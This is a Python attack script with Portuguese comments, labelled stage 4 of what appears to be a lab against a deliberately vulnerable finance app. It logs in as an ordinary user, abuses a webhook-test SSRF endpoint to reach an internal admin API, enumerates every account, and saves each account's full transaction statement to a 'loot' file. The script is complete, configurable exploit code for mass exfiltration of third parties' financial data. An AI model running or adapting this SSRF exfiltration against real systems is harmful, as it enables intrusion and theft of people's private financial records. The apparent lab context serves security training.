#!/usr/bin/env python3
"""
ETAPA 4 - transaction_exfiltrator.py
Exfiltra o extrato de TODAS as contas, via SSRF.

Junta as peças: enumera as contas e, para cada uma, pede ao servidor o extrato
completo pela API interna (/admin/accounts/<user>/transactions), salvando tudo em
um arquivo (loot.json). É a automação do vazamento de dados de terceiros.
Ferramenta independente: edite o bloco CONFIGURAÇÃO abaixo e rode com Python.

    python transaction_exfiltrator.py
"""

import argparse
import json
import time

import httpx

# ==========================================================================
# CONFIGURAÇÃO
# ==========================================================================
APP_URL = "http://localhost:8000"   # onde a aplicação-alvo (FinanceHub) roda
USER, PASSWORD = "joao", "senha123"  # conta comum do atacante
INTERNAL_API = "10.5.0.15:8080"      # host:porta da API administrativa interna
OUT = "loot.json"                    # arquivo de saída com os extratos
# ==========================================================================


def login() -> str:
    r = httpx.post(f"{APP_URL}/auth/login",
                   json={"username": USER, "password": PASSWORD}, timeout=15)
    r.raise_for_status()
    return r.json()["access_token"]


def ssrf_get(token: str, url: str, timeout: float = 10.0) -> dict:
    start = time.perf_counter()
    try:
        r = httpx.post(f"{APP_URL}/vulnerable/webhook/test", json={"url": url},
                       headers={"Authorization": f"Bearer {token}"}, timeout=timeout)
        data = r.json().get("request", {})
    except Exception as exc:  # noqa: BLE001
        data = {"reached": False, "error": type(exc).__name__, "detail": str(exc)}
    data["_rtt_ms"] = round((time.perf_counter() - start) * 1000, 1)
    return data


def _json_body(resp):
    try:
        return json.loads(resp.get("body") or "")
    except (json.JSONDecodeError, TypeError):
        return None


def main(internal_api, out):
    token = login()
    print(f"# exfiltrando extratos de http://{internal_api} via SSRF")

    listing = _json_body(ssrf_get(token, f"http://{internal_api}/admin/accounts")) or {}
    usernames = [a["username"] for a in listing.get("accounts", [])]

    loot = {}
    for user in usernames:
        data = _json_body(ssrf_get(token, f"http://{internal_api}/admin/accounts/{user}/transactions"))
        if data:
            loot[user] = data
            n = len(data.get("transactions", []))
            print(f"{user:10} {data.get('titular'):16} saldo {data.get('balance'):>10}  ({n} transações)")

    with open(out, "w", encoding="utf-8") as f:
        json.dump(loot, f, ensure_ascii=False, indent=2)
    print(f"# {len(loot)} extratos -> {out}")


if __name__ == "__main__":
    ap = argparse.ArgumentParser(description="Exfiltração de extratos via SSRF (API interna).")
    ap.add_argument("--internal-api", default=INTERNAL_API, dest="internal_api")
    ap.add_argument("--out", default=OUT)
    a = ap.parse_args()
    main(a.internal_api, a.out)
